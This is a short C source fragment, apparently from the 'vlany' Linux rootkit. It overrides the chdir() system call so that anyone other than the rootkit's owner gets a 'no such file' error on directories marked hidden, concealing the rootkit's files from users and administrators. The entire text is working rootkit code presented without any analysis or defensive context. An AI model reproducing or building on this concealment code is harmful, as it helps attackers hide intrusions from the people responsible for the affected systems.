int chdir(const char *path)
{
    #ifdef DEBUG
        printf("[vlany] chdir() called\n");
    #endif

    HOOK(old_chdir, CCHDIR);

    if(owned()) return old_chdir(path);

    if(hidden_xattr(path) || hidden_xstat(_STAT_VER, path, 32)) { errno = ENOENT; return -1; }

    return old_chdir(path);
}
